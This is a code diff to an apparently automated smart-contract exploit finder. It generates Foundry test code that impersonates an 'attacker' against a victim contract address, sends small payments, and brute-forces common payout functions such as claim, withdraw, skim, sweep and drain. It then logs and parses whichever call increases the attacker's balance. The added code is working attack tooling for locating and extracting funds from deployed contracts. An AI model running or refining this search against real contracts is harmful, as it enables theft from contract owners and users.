@@ -437,7 +437,7 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         return ""
     
     return """
-        // Adaptive Simulation for Sequencer Fee (Updated Strategy)
+        // Adaptive Simulation for Sequencer Fee (Deep Profit Search)
         // Ensure tx.origin is attacker for refund checks
         vm.stopPrank();
         vm.startPrank(attacker, attacker);
@@ -463,16 +463,60 @@ def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
         }
 
         // 2. Fallback probing if no profit found (or failed)
-        // Try sending 1 wei to contract address (no data)
         if (!profitFound) {
-             // Reset balance for clean check (optional, but let's just check relative gain)
+             // Try sending 1 wei to contract address (no data)
              uint256 balCheck = attacker.balance;
              (sfSuccess, ) = victim.call{value: 1 wei}("");
-             if (sfSuccess) {
-                 if (attacker.balance > balCheck) {
+             if (sfSuccess && attacker.balance > balCheck) {
+                 profitFound = true;
+                 console.log("PROFIT_WEI:", attacker.balance - balCheck);
+                 console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
+             }
+        }
+
+        // 3. Deep Profit Search (Brute-force common payout selectors)
+        if (!profitFound) {
+             bytes4[16] memory selectors = [
+                bytes4(keccak256("getReward()")),
+                bytes4(keccak256("claim()")),
+                bytes4(keccak256("claimReward()")),
+                bytes4(keccak256("distribute()")),
+                bytes4(keccak256("harvest()")),
+                bytes4(keccak256("skim(address)")),
+                bytes4(keccak256("recover()")),
+                bytes4(keccak256("refund()")),
+                bytes4(keccak256("emergencyWithdraw()")),
+                bytes4(keccak256("withdrawAll()")),
+                bytes4(keccak256("withdraw()")),
+                bytes4(keccak256("exit()")),
+                bytes4(keccak256("collect()")),
+                bytes4(keccak256("redeem()")),
+                bytes4(keccak256("sweep()")),
+                bytes4(keccak256("drain()"))
+             ];
+
+             for (uint i = 0; i < selectors.length; i++) {
+                 uint256 balCheck = attacker.balance;
+                 bool s;
+                 
+                 // Try with 0 value
+                 (s, ) = victim.call(abi.encodeWithSelector(selectors[i]));
+                 if (!s) {
+                     // Try with 1 wei
+                     (s, ) = victim.call{value: 1 wei}(abi.encodeWithSelector(selectors[i]));
+                 }
+                 // Try specialized args for skim/recover
+                 if (!s && selectors[i] == bytes4(keccak256("skim(address)"))) {
+                     (s, ) = victim.call(abi.encodeWithSelector(selectors[i], attacker));
+                 }
+
+                 if (s && attacker.balance > balCheck) {
                      profitFound = true;
-                     console.log("PROFIT_WEI:", attacker.balance - balCheck); // Net gain from this step
-                     console.log("SUCCESS_METHOD: sequencer_fee_fallback_wei");
+                     console.log("PROFIT_WEI:", attacker.balance - balCheck);
+                     console.log("SUCCESS_METHOD: deep_search"); 
+                     console.log("SELECTOR:");
+                     console.logBytes4(selectors[i]);
+                     break;
                  }
              }
         }
@@ -810,6 +854,14 @@ def _run_forge_test(victim_address: str, test_content: str, unique_id: str = "")
             method_match = re.search(r"SUCCESS_METHOD: (.*)", result.stdout)
             if method_match:
                 success_method = method_match.group(1).strip()
+                
+                # If Deep Search, extract the selector
+                if success_method == "deep_search":
+                    # Look for SELECTOR: followed by hex on new line or same line
+                    # forge-std console.logBytes4 output typically on new line
+                    sel_match = re.search(r"SELECTOR:.*?((?:0x)[a-fA-F0-9]{8})", result.stdout, re.DOTALL)
+                    if sel_match:
+                        success_method = f"deep_search_{sel_match.group(1)}"
             
             profit_match = re.search(r"PROFIT_WEI: (.*)", result.stdout)
             if profit_match:
